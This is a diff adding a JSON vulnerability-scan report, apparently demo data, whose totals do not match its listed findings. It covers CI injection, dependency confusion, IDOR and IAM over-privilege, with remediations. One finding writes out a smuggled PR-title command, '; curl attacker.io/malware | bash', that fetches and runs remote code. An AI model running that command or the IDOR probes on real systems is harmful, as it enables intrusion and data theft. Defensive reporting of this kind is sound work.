@@ -1,0 +1,178 @@
+{
+  "metadata": {
+    "generated": "2026-04-28",
+    "scanner": "Zer0day Saints",
+    "version": "1.0.0",
+    "tools": 3,
+    "totalFindings": 12
+  },
+  "summary": {
+    "critical": 9,
+    "high": 11,
+    "medium": 5
+  },
+  "tools": [
+    {
+      "id": "chainbreak",
+      "name": "ChainBreak ★",
+      "target": "https://github.com/TopBoy7/Chakam.git",
+      "riskScore": 9.4,
+      "scanTime": "28.4s",
+      "stats": {
+        "critical": 4,
+        "high": 5,
+        "medium": 1
+      },
+      "findings": [
+        {
+          "id": "c1",
+          "severity": "critical",
+          "title": "Fake version of your internal library uploaded to PyPI",
+          "location": "requirements.txt · line 12",
+          "description": "Someone outside your company uploaded a counterfeit copy of your private Python library to the public package registry (PyPI). The fake version has a higher version number than yours.",
+          "businessImpact": "Every developer and every automated build will silently install the attacker's code instead of your own — giving the attacker full access to your servers, secrets, and customer data.",
+          "technical": "acme-internal-auth@2.1.4 published to public PyPI by unknown@proton.me. Internal version is 2.1.3 — pip always prefers the higher version number.",
+          "remediation": "Lock all internal packages with hash verification (--require-hashes) and configure pip to only pull from your private registry."
+        },
+        {
+          "id": "c2",
+          "severity": "critical",
+          "title": "Counterfeit UI library on npm — 3 days old",
+          "location": "package.json · dependencies",
+          "description": "A fake copy of your front-end component library was published to the public npm registry just three days ago. It has a higher version number so npm will download it instead of yours.",
+          "businessImpact": "Your next production deployment will bundle the attacker's code directly into your website, affecting every visitor. This could steal user sessions, payment info, or install malware.",
+          "technical": "@acme/ui-components@4.2.1 on public npm (maintainer: acme-security-test). Internal version 4.1.9 — attacker version wins version resolution.",
+          "remediation": "Force npm to use your private registry with --registry. Lock the lockfile and enable npm audit signatures."
+        },
+        {
+          "id": "c3",
+          "severity": "critical",
+          "title": "Anyone with a pull request can hijack your build servers",
+          "location": ".github/workflows/deploy.yml · line 34",
+          "description": "Your automated build system passes pull request titles directly into shell commands without any safety checks. An attacker just needs to open a PR with a malicious title to take over your servers.",
+          "businessImpact": "External contributor opens a PR titled \"; curl attacker.io/malware | bash\" → your build servers execute it → all AWS keys, database passwords, and API tokens are stolen.",
+          "technical": "run: echo \"${{ github.event.pull_request.title }}\" — unsanitised GitHub Actions expression injection. PR titles are attacker-controlled input.",
+          "remediation": "Never use ${{ }} expressions inside run: steps. Assign to an environment variable first: env: PR_TITLE: ${{ github.event.pull_request.title }}, then use $PR_TITLE."
+        },
+        {
+          "id": "c4",
+          "severity": "critical",
+          "title": "AWS production credentials fully accessible if pipeline is hijacked",
+          "location": "deploy.yml — injectable via finding above",
+          "description": "If an attacker hijacks the build pipeline (finding above), they automatically get your AWS production credentials with administrator-level access to your entire cloud environment.",
+          "businessImpact": "47 storage buckets, 3 production databases, and 12 serverless functions compromised. Complete data breach. Attackers can also delete infrastructure or cause an outage.",
+          "technical": "AWS_ACCESS_KEY_ID maps to arn:aws:iam::123456789012:role/prod-deployer with s3:*, rds:*, secretsmanager:* — no least-privilege applied. Long-lived credentials in CI environment.",
+          "remediation": "Rotate AWS keys immediately. Switch to OIDC federation (keyless auth) for CI. Apply least-privilege IAM — only the permissions each job actually needs."
+        },
+        {
+          "id": "c5",
+          "severity": "high",
+          "title": "Entire GitHub organisation exposed if any workflow is compromised",
+          "location": ".github/workflows/ci.yml · line 8",
+          "description": "Your CI workflow has \"write everything\" permissions. If any part of the pipeline is compromised, the attacker gets write access to every repository, package, and secret in your company.",
+          "businessImpact": "Lateral movement across all engineering repos, ability to push malicious code to any branch, access to every organisation secret and deployment key.",
+          "technical": "permissions: write-all on a PR-triggered workflow. Any fork PR triggers this with full org-level write access via GITHUB_TOKEN.",
+          "remediation": "Apply minimum-required permissions per workflow: contents: read, pull-requests: write. Never use write-all on externally triggered workflows."
+        }
+      ]
+    },
+    {
+      "id": "specterapi",
+      "name": "SpecterAPI",
+      "target": "https://api.shopfront.io",
+      "riskScore": 8.7,
+      "scanTime": "14.2s",
+      "stats": {
+        "critical": 3,
+        "high": 3,
+        "medium": 2
+      },
+      "findings": [
+        {
+          "id": "s1",
+          "severity": "critical",
+          "title": "Admin panel with no login — lists all customer accounts",
+          "location": "/api/v2/admin/users · extracted from JS bundle",
+          "description": "A hidden admin page was found embedded in the app's JavaScript code. Anyone on the internet can visit this URL and get a complete list of all customer accounts — no login required.",
+          "businessImpact": "Full customer database exposed: names, emails, account IDs, and roles — for every single user on the platform. No authentication whatsoever.",
+          "technical": "GET /api/v2/admin/users returns HTTP 200 + full user array with no Authorization header. Route found by extracting strings from minified JS bundle.",
+          "remediation": "Authenticate every admin route at the middleware level, not per-handler. Add route inventory to your security review checklist so hidden routes can't go unnoticed."
+        },
+        {
+          "id": "s2",
+          "severity": "critical",
+          "title": "Any logged-in user can read any other user's personal data",
+          "location": "/api/v2/users/{id} · IDOR confirmed",
+          "description": "The system doesn't check that you're only allowed to see your own account. User #1 can simply change the number in the URL to read User #9,999's private details.",
+          "businessImpact": "Complete customer PII breach: names, emails, phone numbers, billing addresses, dates of birth — for every account on the platform. A single attacker can scrape everything.",
+          "technical": "GET /api/v2/users/9999 authenticated as user 1337 → HTTP 200 with full PII. No server-side ownership check. IDOR (Insecure Direct Object Reference) confirmed.",
+          "remediation": "Add server-side ownership check before every data response: assert request.user.id === resource.owner_id. Never rely on the client to send the right ID."
+        },
+        {
+          "id": "s3",
+          "severity": "critical",
+          "title": "Order history readable across all accounts — includes payment details",
+          "location": "/api/v1/orders/{orderId} · IDOR confirmed",
+          "description": "Customers can read each other's order history by simply changing the order ID in a request. This includes partial payment card numbers and delivery addresses.",
+          "businessImpact": "Card last-4 digits, full shipping addresses, and complete purchase history exposed for every customer. Useful for targeted fraud and phishing attacks.",
+          "technical": "GET /api/v1/orders/{id} — no user_id filter in query. Returns card_last4, shipping_address, line_items for arbitrary IDs. Tested across 50 random IDs, all returned 200.",
+          "remediation": "Always filter order queries by authenticated user ID at the database level: SELECT * FROM orders WHERE id=$1 AND user_id=$2."
+        },
+        {
+          "id": "s4",
+          "severity": "high",
+          "title": "6 undocumented API endpoints discovered — 3 have no authentication",
+          "location": "JavaScript bundle analysis · 6 routes extracted",
+          "description": "Six API routes were hidden inside the app's code but never listed in any documentation. Attackers specifically hunt for these \"shadow\" routes because they're often forgotten and unprotected.",
+          "businessImpact": "Each undocumented endpoint is an unguarded attack surface. One of them (/api/debug/config) returns server environment variables including internal hostnames and config values.",
+          "technical": "Routes: /api/debug/config (200, returns env), /api/internal/payments/refund (no rate limit), /api/admin/impersonate/{id}, /api/v1/export/users, /api/v2/webhooks/debug, /api/v2/admin/users.",
+          "remediation": "Audit all routes against your API gateway config. Remove all /debug/ endpoints from production builds. Add a route inventory step to your security review process."
+        }
+      ]
+    },
+    {
+      "id": "pathforge",
+      "name": "PathForge",
+      "target": "github.com/TopBoy7/Chakam.git",
+      "riskScore": 8.1,
+      "scanTime": "19.8s",
+      "stats": {
+        "critical": 2,
+        "high": 3,
+        "medium": 2
+      },
+      "findings": [
+        {
+          "id": "p1",
+          "severity": "critical",
+          "title": "File upload leads to full production database breach",
+          "location": "main.tf · aws_s3_bucket.user-uploads",
+          "description": "Your file upload storage is publicly writable. An attacker can upload a specially crafted file that triggers your processing system, which then automatically hands over the database password.",
+          "businessImpact": "Complete database breach — 4.2 million user records fully exfiltrated, starting from nothing more than a file upload. No credentials needed to begin the attack.",
+          "technical": "S3 ACL: public-read-write → triggers aws_lambda_function.processor (IAM: s3:*, rds:*, secretsmanager:GetSecretValue) → reads prod DB credentials from Secrets Manager → direct DB access.",
+          "remediation": "Restrict S3 uploads to authenticated users only. Apply least-privilege to Lambda IAM role: s3:GetObject on specific prefix only, remove rds:* and secretsmanager:* entirely."
+        },
+        {
+          "id": "p2",
+          "severity": "critical",
+          "title": "Cloud function has administrator keys to your entire AWS account",
+          "location": "iam.tf · aws_iam_role.lambda-processor-role",
+          "description": "Your file-processing function was given administrator-level access to your entire cloud environment. If this function is ever compromised, the attacker inherits full control of everything.",
+          "businessImpact": "Complete AWS environment takeover — all storage, all databases, all secrets, all other functions. An attacker who compromises this function owns your entire cloud.",
+          "technical": "IAM policy: Action: [\"s3:*\",\"rds:*\",\"secretsmanager:*\",\"lambda:*\",\"ec2:*\"] Resource: \"*\" — wildcard on all actions and all resources. Violates principle of least privilege.",
+          "remediation": "Restrict to minimum required actions on specific resource ARNs. Use IAM permission boundaries. Run AWS IAM Access Analyzer to continuously detect over-privilege."
+        },
+        {
+          "id": "p3",
+          "severity": "high",
+          "title": "Production database accepts connections from the entire internet",
+          "location": "network.tf · aws_security_group.rds-sg",
+          "description": "Your production database is configured to accept connections from any IP address in the world, not just your own servers. If an attacker obtains credentials, they can connect directly.",
+          "businessImpact": "With credentials (found via the attack path above), the database can be directly queried from anywhere. No need to compromise internal systems first.",
+          "technical": "Security group ingress: cidr_blocks = [\"0.0.0.0/0\"] on port 5432. Should be restricted to VPC CIDR 10.0.0.0/16 or specific application subnet.",
+          "remediation": "Update security group to restrict PostgreSQL access to your VPC CIDR only. Consider RDS Proxy with IAM authentication to eliminate password-based access entirely."
+        }
+      ]
+    }
+  ]
+}
